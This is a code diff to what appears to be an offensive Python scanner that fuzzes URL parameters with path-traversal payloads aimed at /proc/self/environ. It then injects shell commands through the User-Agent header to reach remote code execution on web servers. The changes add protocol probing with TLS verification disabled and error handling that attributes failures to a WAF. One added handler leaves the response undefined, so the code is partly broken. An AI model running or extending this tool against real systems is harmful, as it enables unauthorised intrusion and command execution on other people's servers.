@@ -10,11 +10,14 @@ from rich.progress import Progress
 from prompt_toolkit import PromptSession
 from prompt_toolkit.formatted_text import HTML
 from prompt_toolkit.history import InMemoryHistory
+from urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
 class EnvironChecker:
     def __init__(self, url, depth=10, silent=False):
         self.console = Console()
-        self.url = url
+        self.url =self.ensure_correct_protocol(url)
         self.depth = depth
         self.silent = silent
         self.random_user_agent = self._generate_random_string()
@@ -30,6 +33,19 @@ class EnvironChecker:
         "HTTP_CONNECTION",
         "HTTP_COOKIE",
         ]
+    
+    def ensure_correct_protocol(self, url):
+        if not url.startswith(('http://', 'https://')):
+            try:
+                requests.get('https://' + url, timeout=3, verify=False)
+                return 'https://' + url
+            except requests.exceptions.RequestException:
+                try:
+                    requests.get('http://' + url, timeout=3, verify=False)
+                    return 'http://' + url
+                except requests.exceptions.RequestException:
+                    pass
+        return url
         
     def _generate_random_string(self, length=10):
         return ''.join(random.choice(string.ascii_letters) for _ in range(length))
@@ -44,14 +60,13 @@ class EnvironChecker:
                 file_paths.append(('../' * i + file_path, _))
                 file_paths.append((urllib.parse.quote('../' * i + file_path), _))
 
-        console = Console()
         total_operations = len(params.keys()) * len(file_paths)
 
         if not self.silent:
-            with Progress(console=console) as progress:
-                return self._scan(params, file_paths, parsed_url, console, total_operations, progress)
+            with Progress(console=self.console) as progress:
+                return self._scan(params, file_paths, parsed_url, self.console, total_operations, progress)
 
-        return self._scan(params, file_paths, parsed_url, console)
+        return self._scan(params, file_paths, parsed_url, self.console)
 
     def _scan(self, params, file_paths, parsed_url, console, total_operations=None, progress=None):
         task = progress.add_task("[cyan]Scanning...", total=total_operations) if progress else None
@@ -64,12 +79,17 @@ class EnvironChecker:
                 new_params[param_name] = file_path
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                response = requests.get(fuzzed_url, headers=headers, verify=False)
+                
+                try:
+                    response = requests.get(fuzzed_url, headers=headers, verify=False)
+                except requests.exceptions.ConnectionError:
+                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                    return False    
 
                 if any(header in response.text for header in self.HTTP_HEADERS):
                     if file_regex.search(response.text):
                         if not self.silent:
-                            console.print(f'\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
+                            self.console.print(f'\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
                         return True, param_name
                 
                 if progress:
@@ -106,7 +126,11 @@ class EnvironChecker:
                     fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
                     
                     headers = {'User-Agent': cmd}
-                    response = requests.get(fuzzed_url, headers=headers, verify=False)
+                    
+                    try:
+                        response = requests.get(fuzzed_url, headers=headers, verify=False)
+                    except requests.exceptions.ConnectionError:
+                        self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
 
                     pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
                     response_content = pattern.search(response.text)
